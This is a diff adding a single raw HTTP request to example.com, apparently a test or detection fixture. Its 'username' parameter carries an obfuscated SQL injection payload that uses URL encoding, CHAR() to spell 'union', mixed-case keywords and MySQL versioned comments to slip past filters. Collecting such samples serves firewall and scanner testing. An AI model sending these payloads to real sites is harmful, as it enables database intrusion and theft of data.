@@ -1,0 +1,6 @@
+GET /index.php?username=%27%20CHAR%28117%2C110%2C105%2C111%2C110%29%20sE/%2A%2134985%2A/leCt%20NUlL%2CnuLl--%253b%20SELect%201%2C%202 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
